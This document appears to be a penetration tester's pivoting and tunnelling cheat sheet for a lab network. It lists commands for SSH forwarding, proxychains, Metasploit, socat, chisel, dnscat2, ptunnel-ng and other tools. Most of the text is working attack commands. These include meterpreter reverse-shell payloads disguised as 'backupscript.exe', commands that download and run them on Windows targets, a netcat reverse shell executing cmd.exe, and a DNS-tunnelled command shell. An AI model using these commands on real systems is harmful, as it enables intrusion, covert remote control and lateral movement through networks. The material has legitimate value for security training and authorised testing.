## **Dynamic Port Forwarding with SSH and SOCKS Tunneling**
1. Scanning the Pivot Target: `nmap -sT -p22,3306 10.129.202.64`
2. Executing the Local Port Forward: `ssh -L 1234:localhost:3306 ubuntu@10.129.202.64`
3. Confirming Port Forward with Netstat: `netstat -antp | grep 1234`
4. Confirming Port Forward with Nmap: `nmap -v -sV -p1234 localhost`
5. Forwarding Multiple Ports: `ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64`
### **Setting up to Pivot**
1. Enabling Dynamic Port Forwarding with SSH: `ssh -D 9050 ubuntu@10.129.202.64`
2. Checking /etc/proxychains.conf: `tail -4 /etc/proxychains.conf`
3. Using Nmap with Proxychains: `proxychains nmap -v -sn 172.16.5.1-200`
4. Enumerating the Windows Target through Proxychains: `proxychains nmap -v -Pn -sT 172.16.5.19`
5. Using Metasploit with Proxychains: 
    1. `proxychains msfconsole`
    2. `search rdp_scanner`
    3. `set rhosts`
6. Using xfreerdp with Proxychains: `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
## **Remote/Reverse Port Forwarding with SSH**
1. Creating a Windows Payload with msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`
2. Configuring & Starting the multi/handler: 
    1. `use exploit/multi/handler`
    2. `set payload windows/x64/meterpreter/reverse_https`
    3. `set lhost 0.0.0.0`
    4. `set lport 8000`
3. Transferring Payload to Pivot Host: `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`
4. Starting Python3 Webserver on Pivot Host: `python3 -m http.server 8123`
5. Downloading Payload on the Windows Target: ` Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
6. Using SSH -R: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`
7. Meterpreter Session Established: `shell`
## **Meterpreter Tunneling & Port Forwarding**
1. Creating Payload for Ubuntu Pivot Host: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`
2. Configuring & Starting the multi/handler:
    1. `use exploit/multi/handler`
    2. `set payload linux/x64/meterpreter/reverse_tcp`
    3. `set lhost 0.0.0.0`
    4. `set lport 8000`
3. Executing the Payload on the Pivot Host:
    1. `chmod +x backupjob`
    2. `./backupjob`
4. Meterpreter Session Establishment
5. Ping Sweep: `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
6. Ping Sweep For Loop on Linux Pivot Hosts: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
7. Ping Sweep For Loop Using CMD: `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
8. Ping Sweep Using PowerShell: `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`
9. Configuring MSF's SOCKS Proxy: 
    1. `use auxiliary/server/socks_proxy`
    2. `set SRVPORT 9050`
    3. `set SRVHOST 0.0.0.0`
    4. `set version 4a`
    5. Confirming Proxy Server is Running: `job`
10. Adding a Line to proxychains.conf if Needed: `socks4 	127.0.0.1 9050`
11. Creating Routes with AutoRoute:
    1. `use post/multi/manage/autoroute`
    2. `set SESSION 1`
    3. `set SUBNET 172.16.5.0`
    4. It is also possible to add routes with autoroute by running autoroute from the Meterpreter session: `run autoroute -s 172.16.5.0/23`
    5. Listing Active Routes with AutoRoute: ` run autoroute -p`
12. Testing Proxy & Routing Functionality: `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`
### **Port Forwarding**
1. Creating Local TCP Relay: `portfwd add -l 3300 -p 3389 -r 172.16.5.19`
2. Connecting to Windows Target through localhost: `
3. Netstat Output: `netstat -antp`
4. Reverse Port Forwarding Rules: `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`
5. Configuring & Starting multi/handler:
    1. `bg`
    2. `set payload windows/x64/meterpreter/reverse_tcp`
    3. `set LPORT 8081 `
    4. `set LHOST 0.0.0.0 `
6. Generating the Windows Payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234`
7. Execute paylload on Windows host and get a shell with `shell` command.
## **Socat Redirection with a Reverse Shell**
1. Starting Socat Listener: `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`
2. Creating the Windows Payload: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`
3. Configuring & Starting the multi/handler: 
    1. `use exploit/multi/handler`
    2. `set payload windows/x64/meterpreter/reverse_https`
    3. `set lhost 0.0.0.0`
    4. `set lport 80`
4. Test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.
## **Socat Redirection with a Bind Shell**
1. Creating the Windows Payload: `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443`
2. Starting Socat Bind Shell Listener: `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443`
3. Configuring & Starting the Bind multi/handler:
    1. `use exploit/multi/handler`
    2. `set payload windows/x64/meterpreter/bind_tcp`
    3. `set RHOST 10.129.202.64`
    4. `set LPORT 8080`
4. We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
## **SSH for Windows: plink.exe**
1. Using Plink.exe: `plink -ssh -D 9050 ubuntu@10.129.15.50`
2.  Proxifier can be used to start a SOCKS tunnel via the SSH. After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.
## **SSH Pivoting with Sshuttle**
1. Running sshuttle: `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v `
2. With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
## **Web Server Pivoting with Rpivot**
1. Cloning rpivot: `git clone https://github.com/klsecservices/rpivot.git`
2. Installing Python2.7: `sudo apt-get install python2.7`
3. Alternative Installation of Python2.7:
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```
4. Running server.py from the Attack Host: `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
5. Transfering rpivot to the Target: `scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/`
6. Running client.py from Pivot Target: `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`
7. We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.
8. Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox: `proxychains firefox-esr 172.16.5.135:80`
9. Connecting to a Web Server using HTTP-Proxy & NTLM Auth: `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`
## **Port Forwarding with Windows Netsh**
1. Using Netsh.exe to Port Forward: `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25`
2. Verifying Port Forward: `netsh.exe interface portproxy show v4tov4`
## **DNS Tunneling with Dnscat2**
1. Cloning dnscat2 and Setting Up the Server: `git clone https://github.com/iagox86/dnscat2.git`
2. Starting the dnscat2 server: `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`
3. Cloning dnscat2-powershell to the Attack Host: `git clone https://github.com/lukebaggett/dnscat2-powershell.git`
4. Importing dnscat2.ps1: `Import-Module .\dnscat2.ps1`
5. After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server: `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd `
6. Listing dnscat2 Options: `?`
7. Interacting with the Established Session: 
    1. `window -i 1`
## **SOCKS5 Tunneling with Chisel**
1. Clone repo: `git clone https://github.com/jpillora/chisel.git`
2.  `cd chisel`
3. `go build`
4. Transferring Chisel Binary to Pivot Host: `scp chisel ubuntu@10.129.202.64:~/`
5. Running the Chisel Server on the Pivot Host: `./chisel server -v -p 1234 --socks5`
6. Connecting to the Chisel Server: `./chisel client -v 10.129.202.64:1234 socks`
7. Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.
8. Editing & Confirming proxychains.conf: `socks5 127.0.0.1 1080`
### **Chisel Reverse Pivot**
1. Install on attack box: `curl https://i.jpillora.com/chisel! | bash` or clone repo: `git clone https://github.com/jpillora/chisel.git`
2. Edit /etc/proxychains.conf > socks5 127.0.0.1 1080
3. Starting the Chisel Server on our Attack Host: `sudo ./chisel server --reverse -v -p 1234 --socks5`
4. Connecting the Chisel Client to our Attack Host:  `../chisel client -v 10.10.14.17:1234 R:socks`
5. Run command: `proxychains4 -q nmap ip-address`
6. Links:
    1. [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
    2. [https://ap3x.github.io/posts/pivoting-with-chisel/](https://ap3x.github.io/posts/pivoting-with-chisel/)

### **ICMP Tunneling with SOCKS**
1. Cloning Ptunnel-ng: `git clone https://github.com/utoni/ptunnel-ng.git`
2. Building Ptunnel-ng with Autogen.sh: `sudo ./autogen.sh `
3. Alternative approach of building a static binary:
```bash
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```
4. Transferring Ptunnel-ng to the Pivot Host: `scp -r ptunnel-ng ubuntu@10.129.202.64:~/`
5. Starting the ptunnel-ng Server on the Target Host: ` sudo ./ptunnel-ng -r10.129.202.64 -R22`
6. Connecting to ptunnel-ng Server from Attack Host: `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`
7. Tunneling an SSH connection through an ICMP Tunnel: `ssh -p2222 -lubuntu 127.0.0.1`
8. Enabling Dynamic Port Forwarding over SSH: `ssh -D 9050 -p2222 -lubuntu 127.0.0.1`
9. Proxychaining through the ICMP Tunnel: `proxychains nmap -sV -sT 172.16.5.19 -p3389`
## **RDP and SOCKS Tunneling with SocksOverRDP**
1. Loading SocksOverRDP.dll using regsvr32.exe: `regsvr32.exe SocksOverRDP-Plugin.dll`
2. Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080
3. We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
4. When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080
5. Confirming the SOCKS Listener is Started: `netstat -antb | findstr 1080`
## NETCAT
1. Download on windows host: `Invoke-WebRequest -Uri [http://10.10.14.144:9999/nc.exe](http://10.10.14.144:9999/nc.exe) -OutFile nc.exe -UseBasicParsing`
2. Run nc on atack host: `nc -nlvp 4444`
3. Run nc on target: `nc.exe 10.10.14.144 4444 -e cmd.exe`

## NETSH.EXE
1. Using Netsh.exe to Port Forward `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25`
2. Verifying Port Forward `netsh.exe interface portproxy show v4tov4`
3. Connecting to the Internal Host through the Port Forward `xfreerdp /v:ip-address:port /u:user /p:password`